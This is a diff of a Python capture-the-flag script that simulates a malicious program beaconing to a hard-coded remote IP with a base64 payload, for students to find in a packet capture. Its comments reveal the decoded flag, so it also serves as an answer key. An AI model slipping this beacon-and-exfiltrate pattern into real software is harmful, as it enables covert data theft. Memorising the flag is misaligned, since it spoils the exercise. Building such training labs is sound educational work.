@@ -1,6 +1,9 @@
 #This script will make a simple call to a remote IP with a payload.
 #This can simulate a malicious program exfiltrating data or C2
 #Everything is hard coded into the script, no arguments are passed. Change the IP and Port and Payload. Interval can also be adjusted.
+#Student should find a payload being sent every 30 seconds in a packet dumpl.
+#Inside the POST is a base64 encoded string
+#Decoded it contains the CTF flag: CTF-Hax0r!
 
 #!/usr/bin/env python3
 import subprocess
@@ -8,8 +11,8 @@ import time
 
 # Define the remote IP address, port, and payload
 REMOTE_IP = '3.211.25.71'  # Replace with the actual IP address (current IP maps to httpbin.org
-PORT = 80
-PAYLOAD = "Hello, Im the PWN King!(CTF FLag)"
+PORT = 443
+PAYLOAD = "Q1RGLUhheDByIQ=="
 
 # Function to establish a network connection using nc (netcat)
 def establish_network_connection(ip, port, payload):
